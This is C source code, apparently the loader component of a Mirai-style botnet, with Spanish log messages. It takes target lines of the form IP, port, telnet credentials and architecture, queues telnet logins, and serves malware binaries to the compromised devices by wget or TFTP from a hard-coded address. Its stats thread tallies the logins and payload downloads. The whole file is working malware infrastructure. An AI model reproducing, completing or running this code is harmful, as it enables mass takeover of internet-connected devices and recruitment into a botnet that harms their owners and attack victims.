//#define DEBUG_LOG 1

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"

static void *stats_thread(void *);

static struct server *srv;

char *id_tag = "telnet";

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

#ifdef DEBUG
    addrs_len = 1;
    addrs = calloc(4, sizeof (ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
#else
    addrs_len = 1;
    addrs = calloc(addrs_len, sizeof(ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
#endif

    if (!binary_init()) {
#ifdef DEBUG_LOG
        printf("[LOADER] Fallo al cargar bins/dlr.*\n");
#endif
        return 1;
    } else {
#ifdef DEBUG_LOG
        //printf("[LOADER] bins/dlr.* cargados.\n");
#endif
    }

    /*                                                                                   wget address           tftp address */
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "172.20.250.250", 80, "172.20.250.250")) == NULL) {
#ifdef DEBUG_LOG
        printf("[LOADER] Fallo en la inicialización del servidor. Abortando.\n");
#endif
        return 1;
    } else {
        //printf("[LOADER] Servidor inicializado.\n");
    }

    // XXX no queremos ver las estadísticas
    //pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    BOOL only_one = FALSE;

    // Read from stdin
    while (TRUE) {
        if (only_one) {
            printf("break (only_one)\n");
            break;
        }

        char strbuf[1024];

        if (argc == 3) {
            only_one = TRUE;
            printf("only_one = true\n");
            sprintf(strbuf, "%s %s", args[1], args[2]);
        } else {
            if (fgets(strbuf, sizeof(strbuf), stdin) == NULL) {
                printf("empty line in stdin\n");
                break;
            }

            util_trim(strbuf);

            if (strlen(strbuf) == 0) {
                usleep(1000);
                continue;
            }
        }

        printf("[LOADER] Input: %s (%d)\n", strbuf, strlen(strbuf));

        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) == NULL) {
#ifdef DEBUG_LOG
            printf("[LOADER] Error en el parseo telnet info: \"%s\" Formato -> ip:port user:pass arch\n", strbuf);
#endif
        } else {
            if (srv == NULL)
                printf("srv == NULL 2\n");

            server_queue_telnet(srv, &info);
            if (total++ % 1000 == 0)
                usleep(1000);
#ifdef DEBUG_LOG
            printf("[LOADER] Objetivo %s agregado a la cola.\n", strbuf);
#endif
        }

        ATOMIC_INC(&srv->total_input);
    }

    while(ATOMIC_GET(&srv->curr_open) > 0)
        usleep(1000);

    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while (TRUE) {
#ifndef DEBUG
        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
               seconds++, ATOMIC_GET(&srv->total_input), ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
#endif
        fflush(stdout);
        sleep(1);
    }
}
